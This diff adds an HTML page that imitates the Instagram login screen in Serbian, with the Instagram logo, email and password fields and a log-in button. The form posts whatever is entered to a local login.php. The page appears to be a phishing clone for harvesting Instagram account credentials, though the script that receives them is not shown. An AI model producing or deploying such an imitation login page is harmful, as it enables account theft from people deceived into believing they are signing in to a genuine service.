@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=<device-width>, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    .email, .password {
+      display: inline-block;
+      width: 90%;
+      padding-top: 7px;
+      padding-bottom: 7px;
+      border-radius: 3px;
+      border: 1px solid #cccccc;
+      padding-left:10px;
+    }
+    form{
+      text-align: center;
+    }
+    #email{
+      margin-top: 20px;
+    }
+    #password{margin: 20px;}
+    #natpis {
+    width: 90%;
+    max-width: 500px;
+    display: inline-block;
+    position: relative;
+    }
+    #prijava{
+      color:white;
+      background: #0074D9;
+      width: 90%;
+      padding: 10px;
+      border:  1px solid #cccccc;
+      border-radius: 3px;
+    }
+    #help{font-size: 16px;
+    color: #888888;
+    margin: 10px;}
+    #pre{
+      transform: rotate(90deg);
+    }
+    #jezik{
+      margin-bottom: 60px;
+    }
+  </style>
+</head>
+<body>
+<p style="text-align: center; color: #888888;" id="jezik" > Српски (Србија) </p>
+<form method="POST" action="login.php">
+<div id="cont">
+  <img src="natpis.png" alt="instagram" id="natpis">
+  <form>
+  <input type="text" name="email" id="email" class="email" placeholder="Број телефона, корисничко име или емаил">
+  <input type="password" name="password" id="password" class="password" placeholder="lozinka">
+  <button type="submit" id="prijava">Пријави се</button>
+  <div id="help">
+    Заборавили сте податке за пријављивње? <br>
+    <a style="color:blue">Затражите помоћ око пријављивња</a>
+  </div>
+</form>
+</div>
+</form>
+</body>
+</html>
